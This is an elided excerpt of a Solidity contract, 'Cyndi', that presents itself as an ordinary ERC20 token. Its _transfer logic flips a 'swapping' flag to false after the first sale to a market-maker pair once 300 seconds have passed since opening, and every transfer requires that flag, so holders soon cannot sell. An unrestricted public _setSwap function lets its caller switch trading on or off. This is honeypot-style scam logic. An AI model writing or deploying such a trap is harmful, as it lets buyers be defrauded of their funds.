...
contract Cyndi is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    function _transfer(
        ...
        require(swapping == true, "ERC20: no swap");
        if (amount == 0) {
        ...
        if (automatedMarketMakerPairs[to]) {
            if (nowTime - opentime > 300 && rengong == false) {
                swapping = false;
            }
        }
    ...
    function _setSwap(bool swap_, bool rengong_) public {
        swapping = swap_;
        rengong = rengong_;
    }
    ...
    function getrengong() public view returns (bool) {
        return rengong;
    }
